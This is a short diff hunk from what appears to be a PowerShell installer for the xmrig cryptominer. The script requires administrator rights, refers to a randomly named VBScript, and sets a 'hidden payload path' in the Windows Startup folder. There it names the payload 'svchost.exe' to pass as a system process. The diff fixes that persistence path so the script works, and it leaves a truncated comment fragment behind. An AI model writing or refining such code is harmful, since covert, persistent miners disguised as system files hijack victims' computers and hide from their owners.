@@ -119,9 +119,9 @@ cd "$initial_dir\xmrig-6.22.2"
 #& "./TMqhONoBljEv.vbs"
 
 #Requires -RunAsAdministrator
-
+#$env:SystemRoo
 # Define hidden payload path
-$hiddenDir = "$env:SystemRoot\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+$hiddenDir = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
 $payloadName = "svchost.exe"
 $destinationPath = Join-Path $hiddenDir $payloadName
 $newConfigPath_2 = "$initial_dir\xmrig-6.22.2"
